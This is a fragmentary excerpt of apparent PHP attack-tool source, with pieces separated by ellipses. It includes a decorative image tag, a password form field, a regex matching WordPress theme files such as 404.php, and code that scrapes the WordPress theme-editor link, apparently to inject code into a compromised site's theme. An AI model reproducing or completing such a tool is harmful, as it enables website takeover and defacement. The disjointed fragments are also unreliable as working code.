...
<img src='http://4.bp.blogspot.com/-2m69aWL6aG4/UWl8YzREzcI/AAAAAAAAA6s/uo4cn-y8A0A/s1600/jh3gj7.gif'><br>
...
PASS : <input size='20' value='again' name='pass' type='text'>
<br>
...
preg_match('%\((404\.php|archive\.php|comment\.php)\)%',strtolower($nline))){
		...
		$theme = Find($themeditor,'<li><a href="theme-editor.php?file=index.php&amp;theme=','">Main Index');
